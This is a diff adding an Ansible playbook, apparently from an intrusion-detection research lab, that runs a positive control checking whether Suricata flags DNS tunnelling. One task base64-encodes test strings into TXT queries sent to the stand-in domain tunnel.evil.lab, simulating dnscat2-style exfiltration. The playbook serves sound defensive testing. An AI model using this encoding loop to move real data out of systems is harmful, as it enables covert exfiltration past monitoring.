@@ -1,0 +1,54 @@
+---
+- name: Controle positivo - dnscat2 deve ser detectado
+  hosts: localhost
+  vars:
+    solution: "suricata"
+    timestamp: "{{ ansible_date_time.epoch }}"
+
+  tasks:
+    - name: Iniciar captura
+      delegate_to: traffic-monitor
+      ansible.builtin.shell: |
+        nohup tcpdump -i ens3 -w \
+          /home/researcher/pcaps/{{ solution }}_control_positive_{{ timestamp }}.pcap \
+          port 53 &
+      async: 300
+      poll: 0
+
+    - name: Executar dnscat2 (tunneling convencional)
+      delegate_to: victim-linux
+      ansible.builtin.shell: |
+        # Simular DNS tunneling convencional via TXT records
+        for i in $(seq 1 50); do
+          # Codificar dados no QNAME (técnica clássica de DNS tunneling)
+          encoded=$(echo "test-data-chunk-$i" | base64 | tr '+/' '-_' | tr -d '=')
+          dig TXT "${encoded}.tunnel.evil.lab" @10.0.1.2 +short 2>/dev/null
+          sleep 0.1
+        done
+      timeout: 60
+
+    - name: Aguardar processamento
+      ansible.builtin.pause:
+        seconds: 10
+
+    - name: Verificar alertas
+      delegate_to: fw-test
+      ansible.builtin.shell: |
+        if [ -f /var/log/suricata/eve.json ]; then
+          grep -c '"event_type":"alert"' /var/log/suricata/eve.json || echo "0"
+        fi
+      register: alert_count
+      when: solution == 'suricata'
+      ignore_errors: yes
+
+    - name: Resultado controle positivo
+      ansible.builtin.debug:
+        msg: >
+          Controle positivo ({{ solution }}):
+          {% if alert_count is defined %}{{ alert_count.stdout }} alertas{% endif %}
+          - Se 0, configuracao pode estar inadequada.
+
+    - name: Parar captura
+      delegate_to: traffic-monitor
+      ansible.builtin.shell: pkill -f tcpdump
+      ignore_errors: yes
